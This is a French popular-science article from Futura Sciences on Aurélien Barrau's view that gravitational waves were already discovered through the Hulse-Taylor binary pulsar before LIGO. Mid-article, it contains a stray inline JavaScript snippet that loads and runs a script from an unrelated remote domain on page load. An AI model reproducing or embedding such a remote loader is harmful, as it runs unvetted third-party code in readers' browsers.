{"title": "Ondes gravitationnelles : la mise au point du physicien Aurélien Barrau", "newspaper": "Futura Sciences", "author": "Laurent Sacco", "date_publi": "14/02/2016", "content": "Le 3 octobre 2017, Rainer Weiss, Barry C. Barish et Kip Thorne ont reçu le prix Nobel de physique pour la première détection des ondes gravitationnelles grâce à l'instrument Ligo. Les deux premiers pour avoir conçu le système, le troisième pour ses travaux théoriques. Cependant, comme l'ont rappelé plusieurs physiciens, dont Aurélien Barrau, ce n'était pas la première mise en évidence de l'existence de la lumière gravitationnelle... Article publié le 14 février 2016 Aurélien Barrau  est bien connu des lecteurs de Futura-Sciences en raison de ses travaux sur la  cosmologie  quantique, les  étoiles de Planck  mais aussi les minitrous noirs et ses ouvrages sur le  Big Bang et les multivers . Mais le théoricien de la  gravitation quantique  est aussi impliqué dans des projets expérimentaux et observationnels importants, en l'occurrence le  détecteur AMS  à bord de l' ISS  et le futur  télescope   LSST . On attend du premier qu'il nous renseigne sur la  matière noire  et du second qu'il nous éclaire sur l' énergie noire . On ne pourra pas donc reprocher au chercheur de ne pas savoir apprécier la pertinence et l'importance du travail de ses collègues qui ont conçu et construit les détecteurs  Ligo  et  Virgo  ainsi que ceux qui ont analysé le signal détecté par Ligo le 14 septembre 2015. Dans les commentaires que fait Aurélien Barrau sur le  blog  mis à sa disposition par Futura-Sciences, intitulé  Cosmogonie , l'astrophysicien et le philosophe qui a été à l'origine du  Colloque de Lyon sur la cosmologie et la philosophie  se contente simplement de préciser certains points concernant aussi bien la  physique  que l'épistémologie. Voici le début de son billet qui contient plusieurs questions auxquelles Aurélien Barrau répond. C'est avec le radiotélescope d'Arecibo que Hulse et Taylor ont fait la découverte indirecte des ondes gravitationnelles.                               C'est avec le radiotélescope d'Arecibo que Hulse et Taylor ont fait la découverte indirecte des ondes gravitationnelles. ©  Arecibo Observatory  Mise au point sur la détection des ondes gravitationnelles Les  ondes gravitationnelles  sont de petites  vibrations  de l'espace et la journée du 11 février fut historique pour celles-ci ! Nous venons de vivre un événement majeur.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Avant d'entrer dans le vif du sujet, je veux commencer par commenter le titre provocateur de ce billet : il ne s'agit nullement de contester ni de dénigrer la magnifique détection opérée par l'expérience Ligo et moins encore d'en contester l'intérêt phénoménal. Il s'agit d'une mesure à la fois sidérante et émouvante. Voir des  trous noirs  de cette manière est sans précédent dans notre histoire et je vais y venir en conclusion. Mais je crois néanmoins qu'il est important de produire certains éclaircissements par rapport à différentes analyses un peu trop rapides qui fleurissent ici et là, de façon à ce que cette avancée exceptionnelle soit appréciée pour ce qu'elle est vraiment ! 1) Vient-on de découvrir les ondes gravitationnelles ? Non. La découverte est ancienne. Une découverte, en effet, est une indication que l'on considère comme suffisamment fiable pour lui accorder notre crédit. Ce n'est jamais une preuve irréfutable. C'est un faisceau d'indices qui convergent. On ne peut pas être certain, par exemple que ce qu'a mesuré le Cern est bien le  boson de Higgs  prévu par nos théories. Mais cela semble si crédible que nous pouvons collectivement nous mettre d'accord sur le fait qu'il s'agit très vraisemblablement de la découverte expérimentale du Higgs. Et ce sens, je crois qu'on peut s'accorder à considérer que les ondes gravitationnelles avaient déjà, et depuis bien longtemps, été découvertes ! En effet, le  système binaire de Hulse-Taylor, un pulsar  tournant autour d'une  étoile à neutrons , étudié dès 1974 a permis de montrer que la variation de  période orbitale  observée était exactement expliquée par l' émission  d'ondes gravitationnelles. S'ensuivit le prix Nobel en 1993. D'autres systèmes de ce type furent découverts, tous en parfaite adéquation avec ce que prédisait l'émission d'ondes gravitationnelles. À ma connaissance, plus personne ne doutait donc de l'existence des ondes gravitationnelles. La détection a donc déjà eu lieu il y a des décennies. On pourrait objecter qu'il s'agissait d'une détection indirecte tandis que celle, toute récente, de Ligo est directe. Je pense que cette distinction n'a aucun sens épistémologique. Aucune détection n'est jamais « directe » : on observe les effets secondaires d'un phénomène physique sur des objets utilisés comme outils de mesure. C'est ce qui a lieu dans les deux expériences considérées et la seconde (Ligo) n'est pas plus « directe » que la première. Je suis persuadé que si l' interféromètre  de type Ligo existait naturellement et que nous avions nous-mêmes construit le  système binaire , c'est à ce dernier que nous donnerions le qualificatif de « détection directe ». Pour connaître les réponses d'Aurélien Barrau à d'autres questions comme :  A-t-on enfin vu les gravitons ?  A-t-on vu les ondes gravitationnelles primordiales ?  A-t-on enfin prouvé la  relativité générale  ?  Va-t-il enfin devenir possible de tester les théories « au-delà » de la relativité générale ?  Cliquez sur le lien ci-dessous Vient-on vraiment de découvrir les ondes gravitationnelles ? Interview : un trou noir peut-il exploser ?                       Un trou noir est un objet céleste difficile à observer directement. L’intensité de son champ gravitationnel est si intense qu’il empêche en théorie toute forme de matière ou de rayonnement de s’échapper. Peut-il exploser ? C'est la question que Futura-Sciences a posée à Aurélien Barrau, astrophysicien spécialisé en cosmologie et auteur du livre Des univers multiples.                                       Vous avez aimé cet article ? N'hésitez pas à le partager avec vos ami(e)s et aidez-nous à faire connaître Futura :) ! La Rédaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest À voir aussi :  aurelien barrau  |  ondes gravitationnelles  |  les ondes gravitationnelles  |  mise au point pcr  |  moteur de mise au point  |  mise au point telescope  |  latitude de mise au point microscope  |  aurélien brulé wikipedia  |  microlentilles gravitationnelles  |  lentilles gravitationnelles", "theme": "sciences"}